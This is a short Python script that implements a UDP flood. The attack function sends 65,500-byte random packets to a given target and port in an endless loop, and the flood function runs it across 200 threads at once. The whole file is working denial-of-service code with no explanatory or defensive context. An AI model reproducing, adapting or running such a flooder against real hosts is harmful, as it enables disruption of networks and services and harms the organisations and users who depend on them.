import socket,sys
from random import _urandom
from threading import Thread
from time import sleep

def attack(TARGET,PORT):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        bytess = _urandom(65500)
        sock.sendto(bytess, (TARGET,PORT))

def flood(TARGET,PORT):
    for i in range(0,200):
        Thread(target=attack,args=(TARGET,int(PORT))).start()